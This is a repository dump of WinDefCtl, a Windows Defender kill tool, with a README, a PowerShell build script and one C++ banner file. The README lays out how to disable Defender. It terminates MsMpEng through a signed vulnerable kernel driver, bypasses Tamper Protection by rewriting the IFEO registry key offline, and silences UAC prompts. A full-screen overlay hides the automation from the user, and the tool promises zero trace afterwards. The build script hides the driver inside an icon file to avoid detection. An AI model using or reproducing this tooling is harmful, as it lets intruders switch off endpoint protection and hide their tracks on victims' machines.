@@ -1,0 +1,3262 @@
+Project Path: arc_wesmar_WinDefCtl_e3lw_a4_
+
+Source Tree:
+
+```txt
+arc_wesmar_WinDefCtl_e3lw_a4_
+├── ICON
+├── IcoBuilder
+│   └── kvckiller.sys
+├── README.md
+├── build.ps1
+└── src
+    ├── BannerUtils.cpp
+    ├── BannerUtils.h
+    ├── DefenderManager.cpp
+    ├── DefenderManager.h
+    ├── DriverExtract.cpp
+    ├── DriverExtract.h
+    ├── GenIconSize.h
+    ├── KillerEngine.cpp
+    ├── KillerEngine.h
+    ├── Main.cpp
+    ├── OverlayWindow.cpp
+    ├── OverlayWindow.h
+    ├── Resource.h
+    ├── StealthUtils.cpp
+    ├── StealthUtils.h
+    ├── WinDefCtl.cpp
+    ├── WinDefCtl.h
+    ├── WinDefCtl.manifest
+    ├── WinDefCtl.rc
+    ├── WinDefCtl.slnx
+    ├── WinDefCtl.vcxproj
+    ├── WinDefCtl.vcxproj.filters
+    └── WinDefCtl.vcxproj.user
+
+```
+
+`README.md`:
+
+```md
+# WinDefCtl — Windows Defender Automation & Control Utility v2.0
+
+**Full Defender engine kill + RTP/TP slider control via UI Automation**
+
+[![Platform](https://img.shields.io/badge/platform-Windows%2011-blue)]()
+[![Build](https://img.shields.io/badge/build-Release%20x64-brightgreen)]()
+[![License](https://img.shields.io/badge/license-MIT-blue.svg)](LICENSE.md)
+
+---
+
+## ⚡ What's New in v2.0
+
+v2.0 introduces full Defender **engine kill** without restart — no PowerShell, no WMI, no third-party tools.  
+Combines offline IFEO hive manipulation with ring-0 kernel kill via `kvckiller.sys`.
+
+| Command | What it does |
+|---------|-------------|
+| `WinDefCtl kill` | IFEO block + kernel kill of `MsMpEng.exe` + `SecurityHealthSystray.exe` + SCM stop of `SecurityHealthService` |
+| `WinDefCtl restore` | Remove IFEO entries + start `WinDefend` + `SecurityHealthService` + relaunch `SecurityHealthSystray.exe` |
+| `WinDefCtl rtp off\|on\|status` | Real-Time Protection toggle via UI Automation (overlay) |
+| `WinDefCtl tp off\|on\|status` | Tamper Protection toggle via UI Automation (overlay) |
+
+> **Bonus:** v2.0 ships an **optional PowerShell script edition** — same command palette
+> in a single self-contained `.ps1` (~65 KB) with the signed Topaz driver embedded as
+> base64 LZX CAB. See [PowerShell Edition](#-powershell-edition-addon) below.
+
+---
+
+## 📥 Download
+
+**[Latest Release → v2.0.0](https://github.com/wesmar/WinDefCtl/releases/tag/v2.0.0)**
+
+Single standalone executable — no installer, no dependencies, no runtime DLLs.  
+Run as **Administrator**.
+
+PowerShell edition: [`data/WinDefCtl-v2.ps1`](data/WinDefCtl-v2.ps1) (~65 KB, no compiler needed).
+
+---
+
+## 🚀 Usage
+
+```cmd
+WinDefCtl kill              # Kill Defender engine (no restart required)
+WinDefCtl restore           # Re-enable Defender engine
+
+WinDefCtl rtp status        # Check Real-Time Protection state
+WinDefCtl rtp off           # Disable Real-Time Protection
+WinDefCtl rtp on            # Enable Real-Time Protection
+
+WinDefCtl tp status         # Check Tamper Protection state
+WinDefCtl tp off            # Disable Tamper Protection
+WinDefCtl tp on             # Enable Tamper Protection
+```
+
+### Typical Workflow
+
+```cmd
+# Kill engine completely (blocks MsMpEng restart via IFEO)
+WinDefCtl kill
+
+# ... do your thing ...
+
+# Restore everything
+WinDefCtl restore
+
+# Or: just disable RTP for a moment
+WinDefCtl rtp off
+WinDefCtl rtp on
+```
+
+---
+
+## ⚙️ How It Works
+
+### `kill` — Engine Kill (v2.0)
+
+Two-stage, no restart required:
+
+**Stage 1 — IFEO offline hive bypass:**
+
+Direct registry write to `Image File Execution Options` is blocked by Tamper Protection.  
+WinDefCtl bypasses this using an offline hive cycle:
+
+1. `RegSaveKeyEx` — dump live `IFEO` key to `%TEMP%\Ifeo.hiv`
+2. `RegLoadKey(HKLM, TempIFEO, Ifeo.hiv)` — mount as `HKLM\TempIFEO`
+3. Write `Debugger=systray.exe` to `TempIFEO\MsMpEng.exe` (and two secondary targets)
+4. `RegUnLoadKey(TempIFEO)` — unmount
+5. `RegRestoreKey(IFEO, Ifeo.hiv, REG_FORCE_RESTORE)` — kernel-level force-replace
+
+`REG_FORCE_RESTORE` operates below the Tamper Protection filter. Requires `SE_BACKUP_NAME` + `SE_RESTORE_NAME`.
+
+**Stage 2 — Ring-0 process kill via `kvckiller.sys`:**
+
+`kvckiller.sys` carries a valid **digital signature** (service name: `wsftprm`).  
+Loads without DSE bypass, without HVCI restart, without any unsigned-driver prerequisites.
+
+- Driver extracted from embedded LZX CAB (appended to the `.ico` resource at `ICON_HEADER_SIZE` offset)
+- Written to `System32\drivers\kvckiller.sys`
+- Service registered as `wsftprm` (Microsoft validates this service name)
+- IOCTL `0x22201C` on `\\.\Warsaw_PM` → terminates `MsMpEng.exe` + `SecurityHealthSystray.exe`
+- `SecurityHealthService` stopped via SCM
+- Service cleaned up after use (stop → wait for `SERVICE_STOPPED` → delete)
+
+**Smart service reuse:** if `wsftprm` already exists (e.g. from KVC installation) and points to a valid `kvckiller.sys`, the existing service is reused without overwriting.
+
+### `rtp` / `tp` — UI Automation (v1 behavior, unchanged)
+
+Opens `windowsdefender://threatsettings` with `SW_SHOWMINNOACTIVE` (minimized, not activated).  
+Full-screen **Direct2D overlay** covers the desktop immediately — hiding the minimized window from view.  
+Toggles the switch via `IUIAutomationTogglePattern`.
+
+**Overlay technical details:**
+- `WS_EX_TOPMOST | WS_EX_TOOLWINDOW | WS_EX_NOACTIVATE` fullscreen popup, fully opaque black
+- Direct2D + DirectWrite rendering: Consolas Bold 80pt, pulsing green, animated dots, CRT scanlines
+- Background thread — non-blocking, no window activation
+- Released on `Hide()` via `PostMessage(WM_CLOSE)`
+
+### UAC Bypass
+
+Before UI automation, UAC prompts are suppressed:
+- Backup `ConsentPromptBehaviorAdmin` + `PromptOnSecureDesktop` to `HKLM\...\UACStatus`
+- Set both to 0 (no prompts)
+- Automatically restored after operation (or on next run if interrupted)
+
+### Cold Boot Pre-Warming
+
+First run after login: Windows Security components are not yet loaded in memory.  
+WinDefCtl detects this via a volatile registry marker at `HKCU\Software\WinDefCtl\WinDefCtl_Warmed`  
+and pre-loads the Security window before automation begins (~5-7 seconds, first run only).
+
+---
+
+## 📜 PowerShell Edition (Addon)
+
+[`data/WinDefCtl-v2.ps1`](data/WinDefCtl-v2.ps1) — same command palette as the C++ binary,
+in a single self-contained PowerShell script (~65 KB). No compiler, no Visual Studio.
+Drop the file anywhere, run from elevated PowerShell.
+
+```powershell
+.\WinDefCtl-v2.ps1                  # show help (also: /?, -?, -h, --help, "help")
+.\WinDefCtl-v2.ps1 status           # read Defender state (read-only)
+.\WinDefCtl-v2.ps1 kill             # IFEO block + BYOVD kernel kill
+.\WinDefCtl-v2.ps1 restore          # remove IFEO + start WinDefend
+.\WinDefCtl-v2.ps1 rtp off          # Real-Time Protection toggle off
+.\WinDefCtl-v2.ps1 tp  on           # Tamper Protection toggle on
+```
+
+### How it works
+
+| Layer | Implementation |
+|-------|---------------|
+| Driver embedding | `kvckiller.sys` packed with `makecab.exe` (LZX) → base64-chunked → inline in `$DriverCabB64` |
+| Driver deployment | `expand.exe` decompresses CAB directly to `%SystemRoot%\System32\drivers\kvckiller.sys` |
+| SCM lifecycle | `sc.exe create wsftprm type= kernel start= demand` → `sc.exe start` → `sc.exe stop`/`delete` |
+| Kernel kill | P/Invoke `CreateFileW(\\.\Warsaw_PM)` + `DeviceIoControl(0x22201C, <PID buffer>)` |
+| IFEO bypass | `reg.exe save` → `reg.exe load HKLM\TempIFEO` → `reg.exe add Debugger=systray.exe` → `reg.exe unload` → `reg.exe restore /f` (`REG_FORCE_RESTORE`) |
+| UI automation | `System.Windows.Automation` — `TogglePattern` on Real-Time / Tamper / Dev Drive protection toggles |
+| UAC bypass | Both `ConsentPromptBehaviorAdmin` and `PromptOnSecureDesktop` packed into a single `UACStatus` DWORD, restored after the toggle |
+| Overlay | Fullscreen multi-monitor `System.Windows.Forms.Form`, pulsing "PLEASE WAIT" label (sine-wave grey-to-white, 25 FPS) |
+| Cold boot detect | Volatile marker `HKCU\Software\Temp\WinDefCtl_Warmed` |
+
+### Zero trace after `kill`
+
+After the kill flow finishes, all of the following are gone:
+
+- `wsftprm` service (stopped + `DeleteService`)
+- `%SystemRoot%\System32\drivers\kvckiller.sys` (deleted)
+- `%TEMP%\kk.cab` and `%TEMP%\Ifeo.hiv*` (deleted)
+
+Only IFEO entries remain (intentional — that **is** the active block; `restore` clears them).
+
+### Build the script
+
+```powershell
+# Source driver: data\kvckiller.sys
+.\generator\build-ps.ps1
+# Output: out\WinDefCtl-v2.ps1
+```
+
+The generator runs `makecab.exe`, base64-encodes the CAB into 76-char lines and
+substitutes into `generator\template.ps1`. No external NuGet packages, no .NET
+build tools — pure inbox Windows.
+
+### Limits vs. C++ binary
+
+- Slower startup (~1.5 s PowerShell + .NET cold load vs. ~200 ms native exe).
+- Requires `-ExecutionPolicy Bypass` or a signed copy.
+- Defender RTP **may** flag the script on disk (CAB-encoded signed driver inside a PS1).
+  The compiled C++ binary embeds the same driver as an ICO resource so it sits below most heuristics.
+- No D2D overlay — uses WinForms.
+
+---
+
+## 🛠️ Build from Source
+
+**Requirements:** Visual Studio 2022 (v145 toolset), Windows SDK 10.0+
+
+```powershell
+# Full chain: embed driver → compile → stamp timestamps → clean artifacts
+.\build.ps1
+
+# Skip driver embedding (use existing ICON\WinDefCtl.ico)
+.\build.ps1 -SkipDriverPack
+
+# Custom timestamp (for reproducible builds)
+.\build.ps1 -Timestamp "2030-01-01 00:00:00"
+```
+
+**Build chain:**
+1. `Build-DriverIcon` — `makecab` LZX compresses `IcoBuilder\kvckiller.sys`, appends CAB to `IcoBuilder\WinDefCtl.ico` → `ICON\WinDefCtl.ico`
+2. Regenerates `src\GenIconSize.h` with exact icon header byte count
+3. MSBuild `Release|x64`: `/MT` (static CRT), LTCG, no PDB
+4. Timestamp stamp → `bin\WinDefCtl.exe`
+5. Cleans `obj\`
+
+**Output:** `bin\WinDefCtl.exe` (~380 KB, no external dependencies)
+
+---
+
+## 📋 Technical Requirements
+
+- **OS:** Windows 11 (tested on 24H2 / 26H1)
+- **Privileges:** Administrator
+- **Architecture:** x64
+- **Dependencies:** none (static CRT, inbox D2D1/DWrite via system DLLs)
+
+---
+
+## ⚠️ Notes
+
+- `kill` does NOT unload `WinDefend` service — IFEO prevents `MsMpEng.exe` from starting on service start
+- `restore` removes the IFEO block then starts `WinDefend` + `SecurityHealthService`
+- UI Automation (`rtp`/`tp`) requires an active user session
+- Cannot run from Safe Mode or Windows PE
+- kvckiller.sys is digitally signed — no HVCI workaround needed
+
+---
+
+## 📞 Contact & Support
+
+| | |
+|-|-|
+| **Email** | marek@wesolowski.eu.org |
+| **Phone** | +48 607-440-283 |
+| **Website** | https://kvc.pl |
+| **GitHub** | https://github.com/wesmar/WinDefCtl |
+
+**Donations:**
+- PayPal: paypal.me/ext1
+- Revolut: revolut.me/marekb92
+
+---
+
+## ⚖️ Legal Notice
+
+For **authorized security testing and system administration only**.  
+User assumes full legal responsibility for all actions performed.  
+Misuse may violate computer crime laws in your jurisdiction.
+
+---
+
+*© 2026 Marek Wesołowski — WESMAR*
+
+```
+
+`build.ps1`:
+
+```ps1
+#Requires -Version 5.1
+[CmdletBinding()]
+param(
+    [string] $Configuration = 'Release',
+    [string] $Platform      = 'x64',
+    [string] $Timestamp     = '2030-01-01 00:00:00',
+    [switch] $SkipDriverPack    # skip icon-embed + gen_icon_size.h step
+)
+
+Set-StrictMode -Version 3.0
+$ErrorActionPreference = 'Stop'
+Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass -Force
+
+$ProjectRoot = $PSScriptRoot
+$ProjectName = 'WinDefCtl'
+$BinDir      = Join-Path $ProjectRoot 'bin'
+$ObjDir      = Join-Path $ProjectRoot 'obj'
+
+# ── Console helpers ──────────────────────────────────────────────────────────
+
+function Write-Banner {
+    param([string]$Text, [string]$Color = 'Cyan')
+    $line = '-' * 60
+    Write-Host ''
+    Write-Host $line -ForegroundColor DarkGray
+    Write-Host "  $Text" -ForegroundColor $Color
+    Write-Host $line -ForegroundColor DarkGray
+}
+
+function Write-Info    ([string]$m) { Write-Host "    $m" -ForegroundColor Cyan    }
+function Write-Step    ([string]$m) { Write-Host "    $m" -ForegroundColor DarkGray }
+function Write-Ok      ([string]$m) { Write-Host "    $m" -ForegroundColor Green   }
+function Write-Fail    ([string]$m) { Write-Host "    $m" -ForegroundColor Red     }
+
+# ── Timestamp utilities ───────────────────────────────────────────────────────
+
+function Parse-FixedTimestamp ([string]$Value) {
+    $styles = [System.Globalization.DateTimeStyles]::AllowWhiteSpaces -bor
+              [System.Globalization.DateTimeStyles]::AssumeLocal
+    try {
+        return [datetime]::Parse(
+            $Value,
+            [System.Globalization.CultureInfo]::InvariantCulture,
+            $styles)
+    } catch {
+        throw "Invalid -Timestamp '$Value'.  Example: 2030-01-01 00:00:00"
+    }
+}
+
+function Set-FixedFileTimestamp {
+    param(
+        [Parameter(Mandatory)] [string[]] $Paths,
+        [Parameter(Mandatory)] [datetime] $Value
+    )
+    foreach ($p in $Paths) {
+        if (Test-Path -LiteralPath $p) {
+            $item = Get-Item -LiteralPath $p
+            $item.CreationTime   = $Value
+            $item.LastWriteTime  = $Value
+            $item.LastAccessTime = $Value
+        }
+    }
+}
+
+# ── Locate Visual Studio (vswhere + manual fallback) ─────────────────────────
+
+function Get-LatestVsPath {
+    $vswhere = Join-Path ${env:ProgramFiles(x86)} `
+               'Microsoft Visual Studio\Installer\vswhere.exe'
+
+    if (Test-Path -LiteralPath $vswhere) {
+        # Try stable releases first, then prereleases
+        foreach ($prerelease in @('', '-prerelease')) {
+            $args = @('-products', '*',
+                      '-requires', 'Microsoft.Component.MSBuild',
+                      '-property', 'installationPath',
+                      '-latest') + $(if ($prerelease) { @($prerelease) } else { @() })
+            $p = & $vswhere @args 2>$null
+            if ($p) { return $p.Trim() }
+        }
+    }
+
+    # Manual fallback — scan known VS installation directories
+    foreach ($ver in @('18', '17', '16')) {
+        foreach ($base in @(${env:ProgramFiles}, ${env:ProgramFiles(x86)})) {
+            $root = Join-Path $base "Microsoft Visual Studio\$ver"
+            if (-not (Test-Path $root)) { continue }
+            $edition = Get-ChildItem $root -Directory -ErrorAction SilentlyContinue |
+                       Select-Object -First 1
+            if ($edition) { return $edition.FullName }
+        }
+    }
+
+    throw 'Visual Studio with MSBuild component was not found.'
+}
+
+function Get-MSBuildPath ([string]$VsRoot) {
+    # Prefer amd64-native MSBuild for speed/correctness
+    $candidates = @(
+        (Get-ChildItem "$VsRoot\MSBuild" -Filter 'MSBuild.exe' -Recurse -ErrorAction SilentlyContinue |
+            Where-Object { $_.FullName -match 'amd64' } |
+            Select-Object -First 1 -ExpandProperty FullName),
+        (Get-ChildItem "$VsRoot\MSBuild" -Filter 'MSBuild.exe' -Recurse -ErrorAction SilentlyContinue |
+            Select-Object -First 1 -ExpandProperty FullName)
+    )
+    foreach ($c in $candidates) {
+        if ($c -and (Test-Path -LiteralPath $c)) { return $c }
+    }
+    throw "MSBuild.exe not found under: $VsRoot"
+}
+
+# ── Step 0: Embed kvckiller.sys into icon (icon header + LZX CAB) ─────────────
+#
+# Output: ICON\WinDefCtl.ico  =  [original icon bytes]  +  [LZX-CAB of kvckiller.sys]
+# gen_icon_size.h is regenerated with the exact header byte count so the C++
+# runtime knows where to seek for the CAB payload.
+
+function Build-DriverIcon {
+    param(
+        [Parameter(Mandatory)] [string] $DriverPath,
+        [Parameter(Mandatory)] [string] $BaseIcon,
+        [Parameter(Mandatory)] [string] $OutIcon
+    )
+
+    foreach ($f in $DriverPath, $BaseIcon) {
+        if (-not (Test-Path -LiteralPath $f)) {
+            Write-Fail "Required file not found: $f"
+            return $false
+        }
+    }
+
+    $iconBytes   = [System.IO.File]::ReadAllBytes($BaseIcon)
+    $headerSize  = $iconBytes.Length
+
+    $tmpDir = [System.IO.Path]::Combine(
+        [System.IO.Path]::GetTempPath(),
+        "wdc_pack_$([System.IO.Path]::GetRandomFileName())")
+    New-Item -ItemType Directory -Force -Path $tmpDir | Out-Null
+
+    try {
+        # Copy driver to temp with internal CAB name
+        $tmpSys = Join-Path $tmpDir 'kvckiller.sys'
+        Copy-Item -LiteralPath $DriverPath -Destination $tmpSys -Force
+
+        # DDF: LZX compression, single cabinet
+        $ddf = @"
+.Set CabinetNameTemplate=kvckiller.cab
+.Set DiskDirectoryTemplate=$tmpDir
+.Set CompressionType=LZX
+.Set CompressionMemory=21
+.Set MaxCabinetSize=0
+.Set Cabinet=on
+.Set Compress=on
+"$tmpSys" kvckiller.sys
+"@
+        $ddfPath = Join-Path $tmpDir 'pack.ddf'
+        [System.IO.File]::WriteAllText($ddfPath, $ddf, [System.Text.Encoding]::ASCII)
+
+        $p = Start-Process makecab.exe `
+                 -ArgumentList '/F', "`"$ddfPath`"" `
+                 -Wait -PassThru -NoNewWindow -WorkingDirectory $tmpDir
+        if ($p.ExitCode -ne 0) {
+            Write-Fail "makecab.exe failed (exit $($p.ExitCode))"
+            return $false
+        }
+
+        $cabPath = Join-Path $tmpDir 'kvckiller.cab'
+        if (-not (Test-Path -LiteralPath $cabPath)) {
+            Write-Fail "CAB not produced at expected path: $cabPath"
+            return $false
+        }
+
+        $cabBytes = [System.IO.File]::ReadAllBytes($cabPath)
+        $combined = [byte[]]::new($headerSize + $cabBytes.Length)
+        [Array]::Copy($iconBytes, 0, $combined, 0,          $headerSize)
+        [Array]::Copy($cabBytes,  0, $combined, $headerSize, $cabBytes.Length)
+
+        # Ensure ICON\ output directory exists
+        $outDir = Split-Path -Parent $OutIcon
+        if (-not (Test-Path -LiteralPath $outDir)) {
+            New-Item -ItemType Directory -Force -Path $outDir | Out-Null
+        }
+        [System.IO.File]::WriteAllBytes($OutIcon, $combined)
+
+        Write-Step "Driver : $DriverPath ($((Get-Item $DriverPath).Length) B → $($cabBytes.Length) B CAB)"
+        Write-Step "Icon   : $headerSize B header + $($cabBytes.Length) B CAB = $($combined.Length) B total"
+        Write-Step "Output : $OutIcon"
+
+        # Regenerate gen_icon_size.h so C++ code matches exactly
+        $genH = @"
+// Auto-generated by build.ps1 — do not edit manually.
+// Byte count of IcoBuilder\WinDefCtl.ico; CAB payload begins at this offset.
+#pragma once
+#define ICON_HEADER_SIZE $headerSize
+"@
+        $genHPath = Join-Path $ProjectRoot 'src\GenIconSize.h'
+        [System.IO.File]::WriteAllText($genHPath, $genH)
+        Write-Step "GenIconSize.h : ICON_HEADER_SIZE = $headerSize"
+
+        return $true
+    }
+    finally {
+        Remove-Item $tmpDir -Recurse -Force -ErrorAction SilentlyContinue
+    }
+}
+
+# ════════════════════════════════════════════════════════════════════════════
+# MAIN
+# ════════════════════════════════════════════════════════════════════════════
+
+$fixedTs    = Parse-FixedTimestamp -Value $Timestamp
+$fixedTsStr = $fixedTs.ToString('yyyy-MM-dd HH:mm:ss',
+                  [System.Globalization.CultureInfo]::InvariantCulture)
+$epoch      = [DateTimeOffset]::new($fixedTs).ToUnixTimeSeconds()
+$env:SOURCE_DATE_EPOCH = [string]$epoch
+
+Write-Banner "$ProjectName v2.0 - full build chain"
+Write-Step "Configuration : $Configuration | $Platform"
+Write-Step "Timestamp     : $fixedTsStr (epoch $epoch)"
+
+$startTime = Get-Date
+$ok        = $true
+
+# ── Step 0: Package driver ────────────────────────────────────────────────────
+
+if (-not $SkipDriverPack) {
+    Write-Banner '[0] Package kvckiller.sys into icon'
+    $ok = Build-DriverIcon `
+        -DriverPath (Join-Path $ProjectRoot 'IcoBuilder\kvckiller.sys') `
+        -BaseIcon   (Join-Path $ProjectRoot 'IcoBuilder\WinDefCtl.ico') `
+        -OutIcon    (Join-Path $ProjectRoot 'ICON\WinDefCtl.ico')
+} else {
+    Write-Banner '[0] Driver pack SKIPPED (-SkipDriverPack)'
+    if (-not (Test-Path (Join-Path $ProjectRoot 'ICON\WinDefCtl.ico'))) {
+        Write-Fail 'ICON\WinDefCtl.ico missing — run without -SkipDriverPack first'
+        exit 1
+    }
+}
+
+# ── Step 1: Locate toolchain ──────────────────────────────────────────────────
+
+if ($ok) {
+    Write-Banner '[1] Locate Visual Studio'
+    try {
+        $vsPath  = Get-LatestVsPath
+        $msbuild = Get-MSBuildPath -VsRoot $vsPath
+        Write-Step "VS     : $vsPath"
+        Write-Step "MSBuild: $msbuild"
+    } catch {
+        Write-Fail $_
+        $ok = $false
+    }
+}
+
+# ── Step 2: Clean previous obj\ ───────────────────────────────────────────────
+
+if ($ok -and (Test-Path -LiteralPath $ObjDir)) {
+    Remove-Item $ObjDir -Recurse -Force
+    Write-Banner '[2] Cleaned obj\'
+} else {
+    Write-Banner '[2] Clean obj\ (nothing to remove)'
+}
+
+# ── Step 3: MSBuild /t:Rebuild ────────────────────────────────────────────────
+
+if ($ok) {
+    Write-Banner '[3] MSBuild Rebuild'
+
+    if (-not (Test-Path -LiteralPath $BinDir)) {
+        New-Item -ItemType Directory -Path $BinDir | Out-Null
+    }
+
+    Push-Location $ProjectRoot
+    try {
+        & $msbuild "src\$ProjectName.vcxproj" `
+            /p:Configuration=$Configuration `
+            /p:Platform=$Platform `
+            /p:SolutionDir="$ProjectRoot\" `
+            /p:SOURCE_DATE_EPOCH=$epoch `
+            /t:Rebuild /m /nologo /v:minimal
+        if ($LASTEXITCODE -ne 0) {
+            Write-Fail "MSBuild exited $LASTEXITCODE"
+            $ok = $false
+        }
+    }
+    finally {
+        Pop-Location
+    }
+}
+
+# ── Step 4: Stamp output timestamps ───────────────────────────────────────────
+
+if ($ok) {
+    Write-Banner '[4] Stamp output'
+    $exePath = Join-Path $BinDir "$ProjectName.exe"
+    Set-FixedFileTimestamp -Paths @($exePath) -Value $fixedTs
+    Write-Step "Timestamps set to: $fixedTsStr"
+}
+
+# ── Step 5: Post-build clean ──────────────────────────────────────────────────
+
+if ($ok) {
+    Write-Banner '[5] Post-build clean'
+
+    foreach ($d in @($ObjDir, (Join-Path $ProjectRoot 'x64'))) {
+        if (-not (Test-Path -LiteralPath $d)) { continue }
+        $removed = $false
+        for ($i = 0; $i -lt 5; $i++) {
+            try {
+                Remove-Item $d -Recurse -Force -ErrorAction Stop
+                Write-Step "Removed: $d"
+                $removed = $true
+                break
+            } catch {
+                Start-Sleep -Milliseconds 500
+            }
+        }
+        if (-not $removed) { Write-Info "Could not remove $d (locked) — safe to delete manually" }
+    }
+}
+
+# ── Result ────────────────────────────────────────────────────────────────────
+
+$elapsed = (Get-Date) - $startTime
+Write-Host ''
+if ($ok) {
+    $exePath = Join-Path $BinDir "$ProjectName.exe"
+    Write-Host ("  BUILD OK  {0:F2}s  ->  {1}" -f $elapsed.TotalSeconds, $exePath) `
+        -ForegroundColor Green
+    if (Test-Path -LiteralPath $exePath) {
+        $sz = (Get-Item $exePath).Length
+        Write-Host "  Size: $sz B  ($([math]::Round($sz/1KB,1)) KB)" -ForegroundColor Gray
+    }
+} else {
+    Write-Host "  BUILD FAILED ($([math]::Round($elapsed.TotalSeconds,2))s)" -ForegroundColor Red
+    exit 1
+}
+
+```
+
+`src/BannerUtils.cpp`:
+
+```cpp
+#include "BannerUtils.h"
+#include <iostream>
+#include <iomanip>
+
+void BannerUtils::PrintCentered(std::wstring_view text, HANDLE hConsole, WORD color) noexcept
+{
+    int textLen = static_cast<int>(text.length());
+    int padding = (WIDTH - textLen) / 2;
+    if (padding < 0) padding = 0;
+    
+    SetConsoleTextAttribute(hConsole, color);
+    std::wcout << std::wstring(padding, L' ') << text << L"\n";
+}
+
+void BannerUtils::PrintBoxLine(std::wstring_view text, HANDLE hConsole, 
+                                WORD borderColor, WORD textColor) noexcept
+{
+    int textLen = static_cast<int>(text.length());
+    int innerWidth = WIDTH - 2;
+    int padding = (innerWidth - textLen) / 2;
+    if (padding < 0) padding = 0;
+    
+    SetConsoleTextAttribute(hConsole, borderColor);
+    std::wcout << L"|";
+    
+    SetConsoleTextAttribute(hConsole, textColor);
+    std::wcout << std::wstring(padding, L' ') << text
+               << std::wstring(innerWidth - padding - textLen, L' ');
+    
+    SetConsoleTextAttribute(hConsole, borderColor);
+    std::wcout << L"|\n";
+}
+
+void BannerUtils::PrintSectionHeader(const wchar_t* title) noexcept
+{
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    CONSOLE_SCREEN_BUFFER_INFO csbi;
+    GetConsoleScreenBufferInfo(hConsole, &csbi);
+    WORD originalColor = csbi.wAttributes;
+    
+    SetConsoleTextAttribute(hConsole, Colors::YELLOW_BRIGHT);
+    std::wcout << L"=== " << title << L" ===\n";
+    
+    SetConsoleTextAttribute(hConsole, originalColor);
+}
+
+void BannerUtils::PrintCommandLine(const wchar_t* command, const wchar_t* description) noexcept
+{
+    std::wcout << L"  " << std::left << std::setw(38) 
+               << command << L"- " << description << L"\n";
+}
+
+void BannerUtils::ShowBanner() noexcept
+{
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    CONSOLE_SCREEN_BUFFER_INFO csbi;
+    GetConsoleScreenBufferInfo(hConsole, &csbi);
+    WORD originalColor = csbi.wAttributes;
+
+    SetConsoleTextAttribute(hConsole, Colors::BLUE_BRIGHT);
+    std::wcout << L"\n" << BORDER_DOUBLE << L"\n";
+
+    PrintCentered(L"Marek Wesolowski - WESMAR - 2025", hConsole, Colors::WHITE_BRIGHT);
+    PrintCentered(L"WinDefCtl v2.0.0 https://kvc.pl", hConsole, Colors::WHITE_BRIGHT);
+    PrintCentered(L"+48 607-440-283, marek@wesolowski.eu.org", hConsole, Colors::WHITE_BRIGHT);
+    PrintCentered(L"WinDefCtl - Windows Defender Automation & Control Utility", hConsole, Colors::WHITE_BRIGHT);
+    PrintCentered(L"RTP/TP slider control + full engine kill via IFEO+kvckiller", hConsole, Colors::WHITE_BRIGHT);
+
+    SetConsoleTextAttribute(hConsole, Colors::BLUE_BRIGHT);
+    std::wcout << BORDER_DOUBLE << L"\n";
+
+    SetConsoleTextAttribute(hConsole, originalColor);
+}
+
+void BannerUtils::PrintFooter() noexcept
+{
+    HANDLE hConsole = GetStdHandle(STD_OUTPUT_HANDLE);
+    CONSOLE_SCREEN_BUFFER_INFO csbi;
+    GetConsoleScreenBufferInfo(hConsole, &csbi);
+    WORD originalColor = csbi.wAttributes;
+
+    SetConsoleTextAttribute(hConsole, Colors::BLUE_BRIGHT);
+    std::wcout << L"\n" << BORDER_SINGLE << L"\n";
+
+    PrintBoxLine(L"Support this project - a small donation is greatly appreciated", 
+                 hConsole, Colors::BLUE_BRIGHT, Colors::WHITE_BRIGHT);
+    PrintBoxLine(L"and helps sustain private research builds.", 
+                 hConsole, Colors::BLUE_BRIGHT, Colors::WHITE_BRIGHT);
+    PrintBoxLine(L"GitHub source code: https://github.com/wesmar/WinDefCtl/", 
+                 hConsole, Colors::BLUE_BRIGHT, Colors::WHITE_BRIGHT);
+    PrintBoxLine(L"Professional services: marek@wesolowski.eu.org", 
+                 hConsole, Colors::BLUE_BRIGHT, Colors::WHITE_BRIGHT);
+
+    SetConsoleTextAttribute(hConsole, Colors::BLUE_BRIGHT);
+    std::wcout << L"|";
+    
+    std::wstring_view paypal = L"PayPal: ";
+    std::wstring_view paypalLink = L"paypal.me/ext1";
+    std::wstring_view middle = L"        ";
+    std::wstring_view revolut = L"Revolut: ";
+    std::wstring_view revolutLink = L"revolut.me/marekb92";
+    
+    int totalLen = static_cast<int>(paypal.length() + paypalLink.length() + 
+                                   middle.length() + revolut.length() + revolutLink.length());
+    int innerWidth = WIDTH - 2;
+    int padding = (innerWidth - totalLen) / 2;
+    if (padding < 0) padding = 0;
+    
+    SetConsoleTextAttribute(hConsole, Colors::WHITE_BRIGHT);
+    std::wcout << std::wstring(padding, L' ') << paypal;
+    SetConsoleTextAttribute(hConsole, Colors::GREEN_BRIGHT);
+    std::wcout << paypalLink;
+    SetConsoleTextAttribute(hConsole, Colors::WHITE_BRIGHT);
+    std::wcout << middle << revolut;
+    SetConsoleTextAttribute(hConsole, Colors::GREEN_BRIGHT);
+    std::wcout << revolutLink;
+    SetConsoleTextAttribute(hConsole, Colors::WHITE_BRIGHT);
+    std::wcout << std::wstring(innerWidth - totalLen - padding, L' ');
+    
+    SetConsoleTextAttribute(hConsole, Colors::BLUE_BRIGHT);
+    std::wcout << L"|\n";
+
+    std::wcout << BORDER_SINGLE << L"\n\n";
+
+    SetConsoleTextAttribute(hConsole, originalColor);
+}
+
+void BannerUtils::ShowUsage() noexcept
+{
+    ShowBanner();
+    
+    std::wcout << L"Usage: WinDefCtl <command> [arguments]\n\n";
+
+    PrintSectionHeader(L"Engine Kill (IFEO + kvckiller.sys)");
+    PrintCommandLine(L"kill",    L"Terminate Defender engine (IFEO block + kernel kill)");
+    PrintCommandLine(L"restore", L"Re-enable Defender (remove IFEO, start services)");
+    std::wcout << L"\n";
+
+    PrintSectionHeader(L"Real-Time Protection (UI automation + overlay)");
+    PrintCommandLine(L"rtp status", L"Check current RTP status");
+    PrintCommandLine(L"rtp on",     L"Enable Real-Time Protection");
+    PrintCommandLine(L"rtp off",    L"Disable Real-Time Protection");
+    std::wcout << L"\n";
+
+    PrintSectionHeader(L"Tamper Protection (UI automation + overlay)");
+    PrintCommandLine(L"tp status", L"Check current Tamper Protection status");
+    PrintCommandLine(L"tp on",     L"Enable Tamper Protection");
+    PrintCommandLine(L"tp off",    L"Disable Tamper Protection");
+    std::wcout << L"\n";
+
+    PrintSectionHeader(L"Usage Examples");
+    std::wcout << L"  WinDefCtl kill                        # Kill Defender engine completely\n";
+    std::wcout << L"  WinDefCtl restore                     # Restore Defender\n";
+    std::wcout << L"  WinDefCtl rtp off                     # Disable Real-Time Protection\n";
